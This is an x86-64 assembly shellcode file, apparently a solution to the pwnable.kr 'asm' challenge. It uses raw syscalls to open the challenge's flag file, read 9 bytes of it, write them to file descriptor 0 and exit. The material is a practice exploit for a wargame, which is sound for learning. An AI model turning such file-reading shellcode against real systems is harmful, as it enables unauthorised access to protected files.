BITS 64
section .data
msg db "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

section .text
global _start

_start:
  ; 2 -> open(msg, 0)
  mov r10, msg
  mov rax, 2
  mov rdi, r10
  mov rsi, 0
  syscall

  ; 0 -> read(rdi, r10, 9)
  ; rdi is return val from open
  mov rdi, rax
  mov rax, 0
  mov rsi, r10
  mov rdx, 9
  syscall

  ; 1 -> write(0, r10, rdx)
  ; rdx is value returned from read
  mov rdx, rax
  mov rax, 1
  mov rdi, 0
  mov rsi, r10
  syscall

  ; 60 -> exit(0)
  mov rax, 60
  mov rdi, 0
  syscall
